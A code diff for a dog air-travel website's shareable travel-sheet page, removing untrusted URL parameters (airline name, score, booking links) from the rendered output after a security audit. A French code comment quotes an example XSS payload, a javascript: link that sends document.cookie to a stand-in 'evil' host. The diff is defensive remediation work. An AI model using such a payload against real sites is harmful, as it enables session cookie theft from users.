@@ -1,0 +1,118 @@
+diff --git a/packages/ui/src/pages/[...loc]/tools/fiche.astro b/packages/ui/src/pages/[...loc]/tools/fiche.astro
+index 4290a1b..eb9d948 100644
+--- a/packages/ui/src/pages/[...loc]/tools/fiche.astro
++++ b/packages/ui/src/pages/[...loc]/tools/fiche.astro
+@@ -272,14 +272,12 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
+     const C = JSON.parse(document.getElementById("bible-cfg")?.textContent ?? "{}");
+     const T = C.T;
+     const esc = (s) => String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
+-    /* Faille corrigée (audit du 09/08/2026) : cette fiche est un lien profond partageable — tout
+-       son contenu, y compris `air.site`/`air.fiche` (paramètres d'URL `as`/`af`), vient de la
+-       query string. `esc()` échappe les entités HTML mais ne filtre AUCUN schéma d'URL : un lien
+-       forgé `…&as=javascript:fetch('//evil/'+document.cookie)` passait tel quel dans un
+-       `href="${esc(air.site)}"`, échappé pour le HTML mais toujours exécutable au clic. `safeUrl`
+-       n'autorise que http(s): — toute autre valeur (javascript:, data:, vbscript:…) devient une
+-       chaîne vide, ce qui fait disparaître le bouton/lien plutôt que de le rendre dangereux. */
+-    const safeUrl = (s) => { const v = String(s ?? "").trim(); return /^https?:\/\//i.test(v) ? v : ""; };
++    /* Faille corrigée le 09/08/2026 (`safeUrl`, qui neutralisait les schémas dangereux dans les
++       paramètres `as`/`af` de l'ancien lien de réservation compagnie) puis remplacée le 10/08/2026
++       par une correction plus large (Option B, voir plus bas) : ces paramètres, comme tous les
++       autres champs non fiables issus de l'URL, ne sont désormais plus lus ni injectés dans le
++       DOM du tout — `safeUrl` n'a donc plus d'appelant et a été retirée avec le code qui
++       l'utilisait, plutôt que laissée comme protection orpheline. */
+     const mkRe = (arr) => (arr && arr.length)
+       ? new RegExp('(?<![A-Za-zÀ-ÿ])(' + arr.map((w) => w.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|') + ')(?![A-Za-zÀ-ÿ])', 'gi')
+       : null;
+@@ -300,11 +298,18 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
+     const O = DATA[from], D = DATA[to];
+     if (!O || !D) { /* keep the empty hint */ }
+     else {
+-      const air = { name: P.get("an") || "", site: safeUrl(P.get("as")), fiche: safeUrl(P.get("af")),
+-        cabin: P.get("cab") === "1", hold: P.get("hold") === "1", cargo: P.get("cargo") === "1",
+-        direct: P.get("direct") === "1", fee: P.get("fee") || "", embargo: P.get("emb") === "1" };
++      /* Option B (décision Philippe, 10/08/2026) : cette fiche est un lien profond partageable
++       * et rien ne garantit que ses paramètres reflètent encore une décision réelle du Finder —
++       * ils peuvent avoir été copiés depuis une ancienne URL, modifiés à la main, ou forgés.
++       * `safeUrl` (ci-dessus) neutralisait déjà les schémas dangereux dans `as`/`af`, mais un lien
++       * `http(s)` bien formé restait affiché comme si MyDogCanFly l'avait vérifié — une compagnie
++       * inventée avec un score et un lien de réservation à son propre nom apparaissait crédible.
++       * Le nom de compagnie, le score, cabine/soute/fret, le vol direct, le tarif, l'embargo et
++       * les liens sortants compagnie (site, fiche) ne sont donc plus lus depuis l'URL ni injectés
++       * dans le DOM — pas seulement masqués en CSS. Seule reste la chronologie des formalités
++       * pays, qui vient de `bible` (généré côté serveur depuis les données canoniques), jamais de
++       * la query string. */
+       const breed = P.get("breed") || "", brachy = P.get("brachy") === "1", w = P.get("w") || "";
+-      const score = P.get("sc") || "";
+ 
+       const key = (regime) => regime === "eu" ? "eu" : regime === "non_listed" ? "nonListed" : "listed";
+       const pill = (kind) => {
+@@ -316,14 +321,13 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
+       const list = (arr, f) => arr.filter(Boolean).map((x) => `<li>${f ? f(x) : esc(x)}</li>`).join("");
+ 
+       // Outbound links carry the full context (airline, breed, destination) so nothing is lost on back-navigation.
++      // airId/bid restent utilisés uniquement comme contexte de navigation interne (liens vers
++      // les outils caisse/chaleur du site) — aucune donnée de verdict compagnie n'en dépend.
+       const airId = P.get("air") || "", bid = P.get("bid") || "";
+-      const logo = (C.logos || {})[airId] || null;
+-      const logoImg = (cls) => logo ? `<span class="bairlogo ${cls}${logo.dark ? " bairlogo--dark" : ""}"><img src="${esc(logo.src)}" alt="${esc(air.name)}" loading="lazy"></span>` : "";
+       const qs = (pairs) => { const q = pairs.filter((p) => p[1]).map((p) => p[0] + "=" + encodeURIComponent(p[1])).join("&"); return q ? "?" + q : ""; };
+       const addQ = (url, q) => q ? url + (url.indexOf("?") >= 0 ? "&" + q.slice(1) : q) : url;
+       const crateHref = C.crateBase + qs([["air", airId], ["breed", bid]]);
+       const heatHref = C.heatBase + qs([["breed", bid]]);
+-      const airFicheHref = air.fiche ? addQ(air.fiche, qs([["to", to], ["breed", bid]])) : "";
+       const countryHref = (slug) => C.countryBase + slug + "/" + qs([["via", airId], ["breed", bid]]);
+ 
+       // Step content, data-driven from the two country guides.
+@@ -665,12 +669,6 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
+           <div class="bstep__h"><span class="bstep__t">${esc(title)}</span><span class="bchip bchip--${chipKind}">${esc(chip)}</span></div>
+           <div class="bstep__b">${body}</div></div></div>`;
+ 
+-      const capBadges = `<div class="bcaps">
+-        <span class="bcap ${air.cabin ? "is-ok" : "is-no"}">${esc(T.cabin)}${air.cabin ? "" : " ✕"}</span>
+-        <span class="bcap ${air.hold ? "is-ok" : "is-no"}">${esc(T.hold)}${air.hold ? " ✓" : ""}</span>
+-        <span class="bcap ${air.cargo ? "is-ok" : "is-no"}">${esc(T.cargo)}${air.cargo ? " ✓" : ""}</span>
+-        ${air.fee ? `<span class="bfee">${esc(air.fee)}</span>` : ""}</div>`;
+-
+       const sourcesAll = [...(O.sources || []), ...(D.sources || [])];
+       const emailBody = encodeURIComponent(location.href);
+ 
+@@ -685,8 +683,6 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
+               <span class="bleg"><span class="bflag">${flag(from)}</span> ${esc(O.name)}</span>
+             </div>
+             <div class="bsub">${esc(T.dog)} ${w ? esc(w) + " kg" : ""}${breed ? " · " + esc(breed) : ""}</div></div>
+-          <div class="bhead__r"><div class="blbl">${esc(T.airline)}</div><div class="bair"><span>${esc(air.name)}</span></div>
+-            ${score ? `<span class="bscore">${esc(score)} %</span>` : ""}</div>
+         </div>
+ 
+         <div class="bdisclaimer"><span class="bdisclaimer__ic" aria-hidden="true">⚠️</span> <span>${esc(T.disclaimer)}</span></div>
+@@ -715,15 +711,6 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
+         <div class="bcard bcard--warn"><div class="bcard__h">${esc(T.casH)}</div>
+           <ul class="bl">${list(T.cas, emC)}${(departUE(from) || departUE(to)) ? list(T.casUE, emC) : ""}${D.restricted ? `<li>${emC(D.restricted.intro)} ${emC(D.restricted.note)}</li>` : ""}</ul></div>
+ 
+-        <div class="bcard"><div class="bcard__h bvolh"><span>${esc(T.flightH)} — ${esc(air.name)}${air.direct ? " · " + esc(T.out) : ""}</span>${logoImg("bairlogo--block")}</div>
+-          ${capBadges}
+-          <ul class="bl">
+-            <li>${esc(T.holdNote)} ${pill("req")}</li>
+-            <li>${esc(T.bookEarly)} ${pill("adv")}</li>
+-            ${air.embargo ? `<li>${esc(T.embargo)} ${pill("cond")}</li>` : ""}
+-            <li>${esc(T.feeCheck)} ${pill("chk")}</li>
+-          </ul>${airFicheHref ? `<a class="bcrate-cta" href="${esc(airFicheHref)}">✈ ${esc(T.airlineSheet)} : ${esc(air.name)} →</a>` : ""}</div>
+-
+         <div class="bgrid">
+           <div class="bcard"><div class="bcard__h">${esc(T.crateH)}</div><ul class="bl">${list(T.crate)}</ul><a class="bcrate-cta" href="${esc(crateHref)}">📦 ${esc(T.actCrate)} ↗</a></div>
+           <div class="bcard"><div class="bcard__h">${esc(T.heatH)}</div><ul class="bl">${list(T.heat)}</ul><a class="bcrate-cta" href="${esc(heatHref)}">🌡 ${esc(T.actHeat)} ↗</a></div>
+@@ -731,14 +718,12 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
+         <div class="bcard"><div class="bcard__h">${esc(T.careH)}</div><ul class="bl">${list(T.care)}</ul></div>
+ 
+         <div class="bactions">
+-          ${air.site ? `<a class="bbtn" href="${esc(air.site)}" target="_blank" rel="nofollow noopener">🎟 ${esc(T.actBook)} ↗</a>` : ""}
+           <button class="bbtn" type="button" id="b-print">🖨 ${esc(T.actPrint)}</button>
+           <a class="bbtn" href="mailto:?subject=${encodeURIComponent(T.emailSubject)}&body=${emailBody}">✉ ${esc(T.actEmail)}</a>
+         </div>
+ 
+         <div class="bfurther">${esc(T.further)}
+           <a href="${esc(countryHref(D.slug))}">${esc(T.countrySheet)} ${esc(D.name)}</a>
+-          ${air.fiche ? ` · <a href="${esc(airFicheHref)}">${esc(T.airlineSheet)}</a>` : ""}
+         </div>
+ 
+         ${sourcesAll.length ? `<div class="bsources"><b>${esc(T.sourcesH)} :</b> ${sourcesAll.map((s) => `<a href="${esc(s.url)}" target="_blank" rel="nofollow noopener">${esc(s.label)}</a>`).join(" · ")}</div>` : ""}
